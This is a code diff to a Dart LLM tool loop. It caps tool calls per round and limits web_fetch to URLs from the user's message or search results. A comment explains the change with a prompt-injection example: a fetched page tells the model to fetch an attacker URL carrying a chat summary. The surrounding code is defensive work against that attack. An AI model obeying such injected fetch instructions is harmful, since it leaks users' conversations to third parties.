@@ -7,6 +7,10 @@ import 'cloud.dart';
 
 const maxToolRounds = 5;
 
+// Rounds alone do not bound cost: one reply can request many calls, and
+// each web call spends Ollama Cloud quota.
+const maxCallsPerRound = 4;
+
 // Tool output is fed back into the context window; a fetched page can be
 // far larger than the model's window, so it is cut to a predictable size.
 const maxToolResultChars = 8000;
@@ -50,7 +54,7 @@ Future<String> runToolLoop(List<llama.Message> history, ModelCall callModel,
     final calls = reply.toolCalls ?? [];
     history.add(reply);
     if (calls.isEmpty) return reply.content;
-    for (final call in calls) {
+    for (final call in calls.take(maxCallsPerRound)) {
       final function = call.function;
       if (function == null) continue;
       history.add(llama.Message(
@@ -74,19 +78,39 @@ Future<String> _runSafely(
   }
 }
 
-ToolRunner webToolRunner(http.Client client, String apiKey) =>
-    (name, arguments) async {
-      switch (name) {
-        case 'web_search':
-          return jsonEncode(
-              await webSearch(client, apiKey, '${arguments['query']}'));
-        case 'web_fetch':
-          return jsonEncode(
-              await webFetch(client, apiKey, '${arguments['url']}'));
-        default:
-          return 'Unknown tool $name';
-      }
-    };
+final _urlPattern = RegExp(r"https?://[^\s<>()\[\]]+");
+
+/// URLs written in [text], used to seed what web_fetch may open.
+Set<String> urlsIn(String text) =>
+    _urlPattern.allMatches(text).map((m) => m.group(0)!).toSet();
+
+/// web_fetch may only open URLs the user wrote or a web_search returned.
+/// Otherwise a fetched page could instruct the model to "fetch
+/// https://attacker/?d=<chat summary>" and leak the conversation.
+ToolRunner webToolRunner(http.Client client, String apiKey,
+    {Set<String> userUrls = const {}}) {
+  final fetchable = {...userUrls};
+  return (name, arguments) async {
+    switch (name) {
+      case 'web_search':
+        final found = await webSearch(client, apiKey, '${arguments['query']}');
+        for (final result in (found['results'] as List? ?? [])) {
+          final url = (result as Map)['url'];
+          if (url is String) fetchable.add(url);
+        }
+        return jsonEncode(found);
+      case 'web_fetch':
+        final url = '${arguments['url']}';
+        if (!fetchable.contains(url)) {
+          return 'Refused: web_fetch only opens URLs from the user message '
+              'or from web_search results. Search first.';
+        }
+        return jsonEncode(await webFetch(client, apiKey, url));
+      default:
+        return 'Unknown tool $name';
+    }
+  };
+}
 
 const binanceBase = 'https://api.binance.com';
 const klineIntervals = ['1m', '5m', '15m', '1h', '4h', '1d'];
@@ -158,8 +182,10 @@ ToolRunner marketToolRunner(http.Client client) => (name, arguments) async {
 /// Tools and their runner for the enabled packs. A call to a tool outside
 /// the enabled packs is rejected rather than silently run.
 ({List<llama.Tool> tools, ToolRunner run}) buildToolSet(http.Client client,
-    {String? webApiKey, bool market = false}) {
-  final web = webApiKey == null ? null : webToolRunner(client, webApiKey);
+    {String? webApiKey, bool market = false, String userText = ''}) {
+  final web = webApiKey == null
+      ? null
+      : webToolRunner(client, webApiKey, userUrls: urlsIn(userText));
   final markets = market ? marketToolRunner(client) : null;
   return (
     tools: [if (web != null) ...webTools, if (markets != null) ...marketTools],
